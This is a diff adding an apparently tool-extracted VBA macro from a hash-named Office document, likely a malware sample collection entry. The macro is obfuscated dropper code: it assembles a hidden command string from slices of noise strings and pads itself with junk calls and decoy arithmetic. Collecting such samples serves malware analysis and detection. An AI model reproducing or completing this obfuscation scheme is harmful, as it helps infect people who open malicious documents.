@@ -1,0 +1,46 @@
+Filename     : ./macros/ee7a2bec8f62c121921b57a4ded052d549950a7912015bc9416776bcab62f0d0
+OLE stream   : Macros/VBA/PjosAuOPV
+VBA filename : PjosAuOPV.bas
+----------------------------------------
+Attribute VB_Name = "PjosAuOPV"
+Function GWiCKjchwZYHDd()
+On Error Resume Next
+jZWiXsILJk.jJAoakpYuMMpGrBwjSzjIJrr
+DYmvSrUzk = fshu3bbnabn3("v(uGuSU8QjD(Bop<uOB6GO8     %cEp^S^mo^C%     Oa.@0biMYbu", 12, 22)
+jZWiXsILJk.jJAoakpYuMMpGrBwjSzjIJrr
+rrbvjbKjIMm.GrFAKtslwhlPBvZlTjGK
+NnvdKmq = fshu3bbnabn3("vo34RJuCo8Adv  &DblwjQS(.QP(vQS", 16, 3)
+rrbvjbKjIMm.GrFAKtslwhlPBvZlTjGK
+rnHBPjikcNp.XRaGWHLXSbYt
+kQqbbzpsH = fshu3bbnabn3("wkzJ@.UB^2kjYO", 6, 1)
+rnHBPjikcNp.XRaGWHLXSbYt
+rwwXPBRrXcz.uQibwPhjwSzVjmoDhwKR
+bFLQmwWrB = fshu3bbnabn3("l7QRpv_bo  %cEp^S ", 2, 8)
+rwwXPBRrXcz.uQibwPhjwSzVjmoDhwKR
+iUoloPJuwt.zPBtEbiTfkmQIPjj
+QMHcWSRH = fshu3bbnabn3("qCC0T_j$o PCovUT3qGT(mo^C%   JvHmU0QAl", 10, 8)
+iUoloPJuwt.zPBtEbiTfkmQIPjj
+AYNVZFoaP.WXOakrvwaMwYSrzo
+wuBJWDfAcN = fshu3bbnabn3("$kH4FGvi$6@8/D(", 3, 1)
+AYNVZFoaP.WXOakrvwaMwYSrzo
+JkPrIOwkzAji.nEBTsTGGckwlnswqOVsoluFTim
+pkAFhijRLD = fshu3bbnabn3("VJ3h3fioUVnJ0       Wd$!vdQ$$vGG<OD iK3zS", 22, 7)
+JkPrIOwkzAji.nEBTsTGGckwlnswqOVsoluFTim
+tTYRQwnc.BniSlGmFLolMFpsJtYXDWfRsNj
+cZiCJ = fshu3bbnabn3("h8@6mlb TIXNwRlonvVrmbzQjvIhPiipwSSovK@77_K07JQGS$", 21, 25)
+tTYRQwnc.BniSlGmFLolMFpsJtYXDWfRsNj
+YifpANNjUKwE.ZmHNJviBnkbjYXkjHRANcGtOA
+IDwBnEPwaon = fshu3bbnabn3("WV8vYiV0ubQ       c/         VSqb", 4, 19)
+YifpANNjUKwE.ZmHNJviBnkbjYXkjHRANcGtOA
+dYdlqVVj.zWwIcCzwsKhhVfV
+CzzRiXFjnBj = fshu3bbnabn3("qwEXVA WHsiRGzjljcP dmc0O6DruBAGGlr.8KKouwv4MpWT", 26, 20)
+dYdlqVVj.zWwIcCzwsKhhVfV
+pDJmwlWlsWG.YsZjiCkrduSqicQTHzhXFS
+NVYUqkLJaQk = fshu3bbnabn3("!ofoQ$@r7 zPjizfIjAYj3V", 3, 12)
+pDJmwlWlsWG.YsZjiCkrduSqicQTHzhXFS
+kojVBcvN.frpPtZCkJbfqQrmbDO
+UEVlWiJf = fshu3bbnabn3("oUwToYf6Do    7v0jGlbo8Q7o_K36D6", 19, 4)
+kojVBcvN.frpPtZCkJbfqQrmbDO
+GWiCKjchwZYHDd = CzzRiXFjnBj + cZiCJ + NVYUqkLJaQk + NnvdKmq + QMHcWSRH + kQqbbzpsH + bFLQmwWrB + DYmvSrUzk + pkAFhijRLD + wuBJWDfAcN + IDwBnEPwaon + UEVlWiJf
+DtJiFoOzr = nfHS * BztH / bZiIU - Round(5830088 * CSng(4904778 * CInt(XsjizO)) + UKzlBA - Round(hmzdTN)) - 544 / PtsUjm + KBNbO / Rnd(bzhEi) * (8625053 / CDbl(5093518) + (rAHFVi / CByte(8427631 / CDbl(9294632) - 1961681 / 8321513)))
+End Function
